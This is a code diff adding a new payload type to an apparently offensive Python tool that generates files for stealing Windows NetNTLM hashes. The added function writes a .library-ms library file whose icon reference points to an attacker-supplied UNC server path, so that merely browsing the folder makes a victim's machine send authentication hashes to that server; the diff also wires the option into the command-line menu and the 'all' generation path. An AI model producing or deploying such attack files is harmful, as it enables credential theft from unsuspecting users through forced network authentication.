@@ -22,6 +22,7 @@ from __future__ import print_function
 # https://github.com/rocketscientist911/excel-ntlmv2
 # https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
 # https://www.youtube.com/watch?v=PDpBEY1roRc
+# https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt
 
 import argparse
 import io
@@ -64,6 +65,7 @@ parser.add_argument('-g', '--generate',
 		"application",
 		"pdf",
 		"zoom",
+		"libraryms",
 		"autoruninf",
 		"desktopini")),
     help='Choose to generate all files or a specific filetype')
@@ -412,6 +414,41 @@ IconResource=\\\\''' + server + '''\\aa''')
 	file.close()
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
 
+def create_libraryms(generate,server,filename):
+	file = open(filename,'w')
+	file.write('''<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@shell32.dll,-34575</name>
+<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
+<version>1</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>\\\\''' + server + '''\\aa</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription publisher="Microsoft" product="Windows">
+<description>@shell32.dll,-34577</description>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<simpleLocation>
+<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
+<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
+</simpleLocation>
+</searchConnectorDescription>
+<searchConnectorDescription publisher="Microsoft" product="Windows">
+<description>@shell32.dll,-34579</description>
+<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
+<simpleLocation>
+<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
+<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>''')
+	file.close()
+	print("Created: " + filename + " (BROWSE TO FOLDER)")
+
+
 # .lnk remote IconFile Attack
 # Filename: shareattack.lnk, action=browse, attacks=explorer
 def create_lnk(generate,server,filename):
@@ -475,6 +512,8 @@ if (args.generate == "all" or args.generate == "modern"):
 
 	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
+	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+
 	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
 
 	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
@@ -527,6 +566,9 @@ elif(args.generate == "pdf"):
 
 elif(args.generate == "zoom"):
 	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
+
+elif(args.generate == "libraryms"):
+	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
 
 elif(args.generate == "autoruninf"):
 	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
